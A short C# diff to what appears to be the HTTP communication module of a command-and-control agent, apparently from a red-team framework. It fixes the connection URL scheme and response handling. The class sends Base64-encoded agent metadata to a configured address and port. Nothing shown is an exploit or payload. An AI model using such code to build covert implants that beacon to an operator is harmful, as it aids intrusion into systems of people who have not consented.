@@ -29,7 +29,7 @@ namespace Agent.Models
             base.Init(metadata);
 
             _client = new HttpClient();
-            _client.BaseAddress = new Uri($"{ConnectAddress}:{ConnectPort}");
+            _client.BaseAddress = new Uri($"http://{ConnectAddress}:{ConnectPort}");
             _client.DefaultRequestHeaders.Clear();
 
             var encodedMetadata = Convert.ToBase64String(AgentMetadata.Serialise());
@@ -79,7 +79,7 @@ namespace Agent.Models
             var response = await _client.PostAsync("/", content);
             var responseContent = await response.Content.ReadAsByteArrayAsync();
 
-            HandleResponse(response);
+            HandleResponse(responseContent);
         }
 
 
